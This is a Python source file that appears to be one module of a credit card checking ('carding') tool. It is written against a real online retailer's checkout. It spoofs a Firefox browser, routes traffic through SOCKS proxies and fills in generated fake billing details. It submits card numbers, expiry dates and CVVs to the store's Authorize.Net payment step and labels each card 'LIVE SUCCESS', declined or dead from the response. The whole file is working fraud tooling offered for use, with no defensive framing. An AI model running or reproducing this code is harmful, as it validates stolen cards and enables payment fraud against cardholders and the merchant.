
   
import json
import cloudscraper
from time import sleep
from urllib.parse import quote
from random import randint
from dependencie.infobill import infobill

from model.models import gateData
from requests_toolbelt.multipart.encoder import MultipartEncoder

class CoreGateCode:
    def __init__(self, cardID):
        self.cardID = cardID
        self.cardIDx2 = ""
        self.billx = infobill()
    def getStr(self,data,inicio,final):
        strx1 = data.split(inicio)
        strx2 = strx1[1].split(final)
        return strx2[0]
    def __valiDCardId(self):
        if self.cardID == 'visa':
            self.cardIDx2 = 'authnet:Visa'
        elif self.cardID == 'mc':
            self.cardIDx2 = 'authnet:MasterCard'
        elif self.cardID == 'amex':
            self.cardIDx2 = 'authnet:AmerExp'
        elif self.cardID == 'discovery':
            self.cardIDx2 = 'authnet:Discover'

    def processCodeGate(self,cc,dataGate:gateData):
        self.__valiDCardId()
        cc1 = cc.ccnum[0:6]
        cc2 = cc.ccnum[12:16]



        proxies = {
            'http': f'socks5://{dataGate.proxy}',
            'https': f'socks5://{dataGate.proxy}'
        }
        timeout = 40

        cs = cloudscraper.create_scraper(
            browser={
                'browser': 'firefox',
                'platform': 'windows',
                'mobile': False

            },
            debug=False

        )


    #datext

        #cs.proxies.update(proxies)
        try:
            status = dict()


#x xxxx


            url="https://wingstuff.com/products/33153-universal-microphone-windsocks-large-or-small"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"none",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)




            mp_encoder = MultipartEncoder(
                {
                    "Old_Screen":'PROD',
                    "Old_Search":"",
                    "Action":"ADPR",
                    "Product_Code":"PG33153",
                    "Category_Code":'headset_accessories',
                    "Offset":"",
                    "AllOffset":"",
                    "CatListingOffset":"",
                    "RelatedOffset":"0",
                    "SearchOffset":"",
                    "show":"",
                    "Product_Attributes[1]:code":"choose_size",
                    "Product_Attributes[1]:value":"small",
                    "Product_Attribute_Count":"1",
                    "Waitlist_Email":"",
                    "Quantity":"1"
                }
            )





            url="https://wingstuff.com/cart?ajax=1"
            headers={

            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",

            "Content-Type":mp_encoder.content_type,
            "Origin":"https://wingstuff.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://wingstuff.com/products/33153-universal-microphone-windsocks-large-or-small",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            datac=cs.post(url=url,headers=headers,data=mp_encoder,proxies=proxies,timeout=timeout)


            url="https://wingstuff.com/cart?do_checkout=1"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://wingstuff.com/products/33153-universal-microphone-windsocks-large-or-small",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)



            url="https://wingstuff.com/checkout.html?nc=1650959791"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://wingstuff.com/cart?do_checkout=1",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            "Sec-Fetch-User":"?1",
            'TE':'trailers'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)


            url="https://wingstuff.com/checkout-customer-information.html"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",

            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://wingstuff.com/checkout.html?nc=1650959791",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            "Sec-Fetch-User":"?1",
            'TE':'trailers'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)


            emailxas = self.billx.emailx

            url="https://wingstuff.com/checkout-special-offers.html"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",

            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://wingstuff.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://wingstuff.com/checkout-customer-information.html",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            "Sec-Fetch-User":"?1",
            'TE':'trailers'
            }
            data='Action=ORDR&shipping_to_show=1&ShipFirstName='+self.billx.nameFirs+'&ShipLastName='+self.billx.nameLast+'&ShipCompany=&ShipEmail='+emailxas+'%40gmail.com&ShipPhone='+self.billx.phone1+'&ShipAddress1='+self.billx.address+'&ShipAddress2=&ShipCity='+self.billx.city+'&ShipStateSelect='+self.billx.estado2+'&ShipState=&ShipCountry=US&ShipZip='+self.billx.zipcode+'&billing_to_show=1&BillFirstName='+self.billx.nameFirs+'&BillLastName='+self.billx.nameLast+'&BillCompany=&BillEmail='+emailxas+'%40gmail.com&BillPhone='+self.billx.phone1+'&BillAddress1='+self.billx.address+'&BillAddress2=&BillCity='+self.billx.city+'&BillStateSelect='+self.billx.estado2+'&BillState=&BillCountry=US&BillZip='+self.billx.zipcode
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)


            shipmet = self.getStr(datac.text,'name="ShippingMethod" value="','"')

            url="https://wingstuff.com/checkout-payment-information.html"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://wingstuff.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://wingstuff.com/checkout-special-offers.html",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            "Sec-Fetch-User":"?1",
            'TE':'trailers'
            }
            data='Action=SHIP%2CPSHP%2CCTAX&ShippingMethod='+shipmet+'&PaymentMethod=authnet%3AVisa'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)


            payTok = self.getStr(datac.text,'PaymentAuthorizationToken" value="','"')

            url="https://wingstuff.com/mm5/merchant.mvc?"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",

            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://wingstuff.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://wingstuff.com/checkout-payment-information.html",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            "Sec-Fetch-User":"?1",
            'TE':'trailers'
            }
            data='Action=AUTH&Screen=INVC&Store_Code=wings&AuthorizeNet_Method_Type=CC&PaymentAuthorizationToken='+payTok+'&PaymentMethod='+self.cardIDx2+'&SplitPaymentData=&AuthorizeNet_First_Name='+self.billx.nameFirs+'&AuthorizeNet_Last_Name='+self.billx.nameLast+'&AuthorizeNet_Card_Num='+cc.ccnum+'&AuthorizeNet_CardExp_Month='+cc.expm+'&AuthorizeNet_CardExp_Year='+cc.expy+'&AuthorizeNet_Cvv='+cc.cv2+'&question1=&question2=&question3=Billing+and+Shipping+addresses+match%21&maxquestions=3'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)


            if 'Unable to authorize payment.' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DECLINADA]",'proxy':dataGate.proxy,'datext':None}
            elif "This transaction has been declined" in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DIE]",'proxy':dataGate.proxy,'datext':None}
            # elif "CVV2 Mismatch: 15004-This transaction cannot be processed." in datac.text:
            #     status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DIE]",'proxy':dataGate.proxy,'datext':None}
            # elif "Your credit card payment has been declined due to incorrect card details or insufficient funds on the card." in datac.text:
            #     status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DIE]",'proxy':dataGate.proxy,'datext':None}
            elif "Thank you" in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+" [LIVE SUCCESS]",'proxy':dataGate.proxy,'datext':None}
            else:
                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': " CC =====>"+dataGate.cc,'proxy':dataGate.proxy,'datext':None}
                
            return status
        except Exception as e:
            print(e,'que paso')
            return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}
